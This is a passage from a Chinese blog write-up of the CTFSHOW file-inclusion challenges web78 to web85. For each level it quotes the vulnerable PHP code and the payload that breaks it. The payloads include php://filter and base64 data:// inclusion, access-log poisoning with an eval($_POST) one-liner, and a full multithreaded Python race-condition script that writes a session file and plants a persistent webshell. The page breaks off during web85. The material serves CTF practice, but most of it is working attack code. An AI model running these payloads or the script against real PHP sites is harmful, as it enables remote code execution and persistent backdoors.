<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>【CTFSHOW】web入门文件包含 - IT学习者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="【CTFSHOW】web入门文件包含" />
<meta property="og:description" content="文章目录 web78web79web80web81web82web83web84web85web86web87web88web116web117参考视频参考博客 web78 if(isset($_GET[&#39;file&#39;])){ $file = $_GET[&#39;file&#39;]; include($file); }else{ highlight_file(__FILE__); } 没有过滤，一开始想直接包含flag.php，发现一片空白。使用php://filter伪协议读取flag.php内容，进行base64解码得到flag。
payload：
?file=php://filter/convert.base64-encode/resource=flag.php
web79 if(isset($_GET[&#39;file&#39;])){ $file = $_GET[&#39;file&#39;]; $file = str_replace(&#34;php&#34;, &#34;???&#34;, $file); include($file); }else{ highlight_file(__FILE__); } 过滤了php，使用data伪协议即可。
base64编码的内容为：
&lt;?=system(&#39;tac flag.php&#39;);?&gt; payload：
?file=data://text/plain;base64,PD89c3lzdGVtKCd0YWMgZmxhZy5waHAnKTs/Pg==
web80 if(isset($_GET[&#39;file&#39;])){ $file = $_GET[&#39;file&#39;]; $file = str_replace(&#34;php&#34;, &#34;???&#34;, $file); $file = str_replace(&#34;data&#34;, &#34;???&#34;, $file); include($file); }else{ highlight_file(__FILE__); } 可以看到，php和data都被过滤替换成了三个‘?’。根据hint，可以通过包含nginx的日志文件access.log进行文件包含操作。
使用?file=/var/log/nginx/access.log访问日志，发现会留有记录。
修改UA头，发现可以执行phpinfo命令：
使用&amp;_POST[]传入POST参数，ls查询当前目录，发现flag已被更改文件名：
使用tac命令，得到flag：
对这题思路的个人理解是，首先通过访问向日志写入需要的php命令，比如&lt;?=eval($_POST[1]);?&gt;。当再次访问时会执行这些命令，这时可以添加参数，比如1=system(“tac fl0g.php”);以回显flag。
web81 添加了过滤冒号‘:’
同web80
web82 if(isset($_GET[&#39;file&#39;])){ $file = $_GET[&#39;file&#39;]; $file = str_replace(&#34;" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://itnewbiea.github.io/posts/d704243229d08cfd3661eaee4106d9ef/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2021-07-23T22:10:45+08:00" />
<meta property="article:modified_time" content="2021-07-23T22:10:45+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="IT学习者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">IT学习者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">【CTFSHOW】web入门文件包含</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-tomorrow-night">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <p></p> 
<div class="toc"> 
 <h4>文章目录</h4> 
 <ul><li><ul><li><a href="#web78_1" rel="nofollow">web78</a></li><li><a href="#web79_20" rel="nofollow">web79</a></li><li><a href="#web80_44" rel="nofollow">web80</a></li><li><a href="#web81_77" rel="nofollow">web81</a></li><li><a href="#web82_85" rel="nofollow">web82</a></li><li><a href="#web83_187" rel="nofollow">web83</a></li><li><a href="#web84_208" rel="nofollow">web84</a></li><li><a href="#web85_232" rel="nofollow">web85</a></li><li><a href="#web86_281" rel="nofollow">web86</a></li><li><a href="#web87_304" rel="nofollow">web87</a></li><li><a href="#web88_424" rel="nofollow">web88</a></li><li><a href="#web116_462" rel="nofollow">web116</a></li><li><a href="#web117_486" rel="nofollow">web117</a></li><li><ul><li><a href="#_536" rel="nofollow">参考视频</a></li><li><a href="#_540" rel="nofollow">参考博客</a></li></ul> 
  </li></ul> 
 </li></ul> 
</div> 
<p></p> 
<h3><a id="web78_1"></a>web78</h3> 
<pre><code class="prism language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>没有过滤，一开始想直接包含flag.php，发现一片空白。使用php://filter伪协议读取flag.php内容，进行base64解码得到flag。</p> 
<p>payload：</p> 
<p>?file=php://filter/convert.base64-encode/resource=flag.php</p> 
<p><img src="https://images2.imgbox.com/46/0b/xmg6o188_o.png" alt="fileincluding78flag1"></p> 
<h3><a id="web79_20"></a>web79</h3> 
<pre><code class="prism language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>过滤了php，使用data伪协议即可。</p> 
<p>base64编码的内容为：</p> &lt;?=system('tac flag.php');?&gt; 
<p>payload：</p> 
<p>?file=data://text/plain;base64,PD89c3lzdGVtKCd0YWMgZmxhZy5waHAnKTs/Pg==</p> 
<p><img src="https://images2.imgbox.com/ef/59/bc6nP54k_o.png" alt="fileincluding79flag1"></p> 
<h3><a id="web80_44"></a>web80</h3> 
<pre><code class="prism language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>可以看到，php和data都被过滤替换成了三个‘?’。根据hint，可以通过包含nginx的日志文件access.log进行文件包含操作。</p> 
<p>使用?file=/var/log/nginx/access.log访问日志，发现会留有记录。</p> 
<p><img src="https://images2.imgbox.com/14/d0/Q9H9k7rV_o.png" alt="fileincluding80accesslog1"></p> 
<p>修改UA头，发现可以执行phpinfo命令：</p> 
<p><img src="https://images2.imgbox.com/46/69/1jjVlIEq_o.png" alt="fileincluding80ua1"></p> 
<p>使用&amp;_POST[]传入POST参数，ls查询当前目录，发现flag已被更改文件名：</p> 
<p><img src="https://images2.imgbox.com/e6/86/UW6O0FBJ_o.png" alt="fileincluding80flag1"></p> 
<p>使用tac命令，得到flag：</p> 
<p><img src="https://images2.imgbox.com/9d/36/3FH4h4GN_o.png" alt="fileincluding80flag2"></p> 
<p>对这题思路的个人理解是，首先通过访问向日志写入需要的php命令，比如&lt;?=eval($_POST[1]);?&gt;。当再次访问时会执行这些命令，这时可以添加参数，比如1=system(“tac fl0g.php”);以回显flag。</p> 
<h3><a id="web81_77"></a>web81</h3> 
<p>添加了过滤冒号‘:’</p> 
<p>同web80</p> 
<h3><a id="web82_85"></a>web82</h3> 
<pre><code class="prism language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">":"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>可以看到，’.'也被过滤了。</p> 
<p>php中唯一能无后缀控制的，只有session文件。</p> 
<p>这题的思路和2021年国赛初赛web的middle_source差不多，都是通过对session临时tmp文件的<strong>条件竞争</strong>，生成木马文件实现rce。</p> 
<p><strong>原理浅析：</strong></p> 
<ul><li>当开启session时，服务器会在临时目录下创建session文件来保存会话信息，文件名格式为sess_PHPSESSID。一般的linux会将session保存在其中的某一个目录下：</li></ul> 
<pre><code class="prism language-shell">/var/lib/php/
/var/lib/php/sessions/
/tmp/
/tmp/sessions/
</code></pre> 
<ul><li> <p>一般开发的web服务会使用多线程接收用户的请求，而线程同步机制确保两个及以上的并发进程或线程不同时执行某些特定的程序段，依靠临界区(critical section)。session的临界区即上文说的临时目录。</p> <p>如果没有应用好同步技术则会产生“竞争条件”问题。意外生成攻击者想要生成的文件，这样攻击者可以在该文件还未被删除的时间段内进行非法操作。</p> </li><li> <p>PHP_SESSION_UPLOAD_PROGRESS用于设置/tmp目录下生成的sess_PHPSESSID文件的内容</p> </li></ul> 
<p>所以我们可以使用python脚本进行多线程请求，生成sess_PHPSESSID文件，实现rce。</p> 
<p>python脚本如下：</p> 
<pre><code class="prism language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> io
<span class="token keyword">import</span> threading

url <span class="token operator">=</span> <span class="token string">'http://a1ec5255-7dd7-405a-8c05-d61d50ce9ed7.challenge.ctf.show:8080/'</span>    <span class="token comment"># 改成自己的url</span>
sessionid <span class="token operator">=</span> <span class="token string">'truthahn'</span>      <span class="token comment"># 设置PHPSESSID为truthahn，使生成的临时文件名为sess_truthahn</span>
cookies <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
            <span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span>sessionid
        <span class="token punctuation">}</span>

<span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>		<span class="token comment"># write()函数用于写入session临时文件</span>
    fileBytes <span class="token operator">=</span> io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">1024</span><span class="token operator">*</span><span class="token number">50</span><span class="token punctuation">)</span>    <span class="token comment"># 设置上传文件的大小为50k</span>
    data2 <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
        <span class="token string">'PHP_SESSION_UPLOAD_PROGRESS'</span><span class="token punctuation">:</span><span class="token string">'&lt;?=eval($_POST[1])?&gt;'</span>    <span class="token comment"># 设置sess_truthahn临时文件的内容为&lt;?=eval($_POST[1])?&gt; 实现一句话</span>
    <span class="token punctuation">}</span>
    files <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
        <span class="token string">'file'</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token string">'truthahn.jpg'</span><span class="token punctuation">,</span>fileBytes<span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    
        res <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data2<span class="token punctuation">,</span>cookies<span class="token operator">=</span>cookies<span class="token punctuation">,</span>files<span class="token operator">=</span>files<span class="token punctuation">)</span>
        <span class="token comment"># print(res.text)</span>
        <span class="token comment">#print('======= write done! ======')</span>

<span class="token keyword">def</span> <span class="token function">read</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span> 		<span class="token comment"># read()函数利用session临时文件生成一句话木马，实现rce</span>
    data1 <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
        <span class="token string">"1"</span><span class="token punctuation">:</span><span class="token string">"file_put_contents('/var/www/html/3.php','&lt;?=eval($_POST[2]);?&gt;');"</span>     <span class="token comment"># 使用file_put_contents()php内置函数生成名为3.php的shell文件</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        res <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">'?file=/tmp/sess_'</span><span class="token operator">+</span>sessionid<span class="token punctuation">,</span>data<span class="token operator">=</span>data1<span class="token punctuation">,</span>cookies<span class="token operator">=</span>cookies<span class="token punctuation">)</span>
        <span class="token comment"># print(res.text)</span>
        res2 <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">'3.php'</span><span class="token punctuation">)</span>
        <span class="token comment"># print(res2.text)</span>
        <span class="token keyword">if</span> res2<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>     <span class="token comment">#若3.php成功生成，则返回Done!，否则返回失败的状态码</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'++++++++ Done! +++++++++'</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>res2<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>

    event <span class="token operator">=</span> threading<span class="token punctuation">.</span>Event<span class="token punctuation">(</span><span class="token punctuation">)</span>       
    <span class="token keyword">with</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> session<span class="token punctuation">:</span>     <span class="token comment"># 为每个函数设置5个线程并发执行</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token comment">#print('*'*50)</span>
            threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>write<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token comment">#print('='*50)</span>
            threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>read<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>

    event<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> 
<p>在显示Done!后，访问url+3.php，并POST方式传参，即可获取flag：</p> 
<p><img src="https://images2.imgbox.com/ab/95/ibBlkkez_o.png" alt="fileincluding82flag1"></p> 
<p>flag如下：</p> 
<p><img src="https://images2.imgbox.com/08/4e/MNtMe3WX_o.png" alt="fileincluding82flag2"></p> 
<h3><a id="web83_187"></a>web83</h3> 
<pre><code class="prism language-php"><span class="token function">session_unset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">session_destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">":"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>同web82，虽然销毁了session，但我们还是可以自行创建。多运行一会脚本就行了。</p> 
<h3><a id="web84_208"></a>web84</h3> 
<pre><code class="prism language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">":"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"rm -rf /tmp/*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>同web82。</p> 
<p>这题在包含文件命令之前执行了删除/tmp目录下所有文件的操作，貌似session_upload的方式失效了，但实际上该方法仍可使用。</p> 
<p>原因在于cpu并发执行时存在间隔时间即分片，当我们多线程请求后，就有可能一个线程中system(“rm -rf /tmp/*”);命令执行完了，另一个线程没有执行删除命令但已写入sess_PHPSESSID文件，这样第一个线程文件包含时session文件仍然存在。基于此可生成一句话木马。</p> 
<p>脚本多执行一段时间就会发现返回码从404变成了200ヾ(•ω•`)o</p> 
<h3><a id="web85_232"></a>web85</h3> 
<pre><code class="prism language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">":"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"&lt;"</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p><strong>解法一：</strong></p> 
<p>同样是运行web82的脚本。</p> 
<p>同样是机制问题，多线程并发导致的执行错序。使得不可能成立的逻辑成立了。。。</p> 
<p><strong>尝试二（失败）：</strong></p> 
<p>尝试使用data协议和baes64编码规避对尖括号的过滤，但由于存在反序列化的成分，无法直接调用data协议，所以<strong>失败</strong>2333</p> 
<p>尝试修改脚本中write()函数的data2中PHP_SESSION_UPLOAD_PROGRESS上传的值：</p> 
<pre><code class="prism language-python"><span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>
    fileBytes <span class="token operator">=</span> io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">1024</span><span class="token operator">*</span><span class="token number">50</span><span class="token punctuation">)</span>    <span class="token comment"># 设置上传文件的大小为50k</span>
    data2 <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span> 	<span class="token string">'PHP_SESSION_UPLOAD_PROGRESS'</span><span class="token punctuation">:</span><span class="token string">'data://text/plain;base64,PD89ZXZhbCgkX1BPU1RbMV0pPz4='</span>    <span class="token comment"># 使用data协议和baes64编码规避对尖括号的过滤，但由于存在反序列化的成分，无法直接调用data协议，所以失败</span>
    <span class="token punctuation">}</span>
    files <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
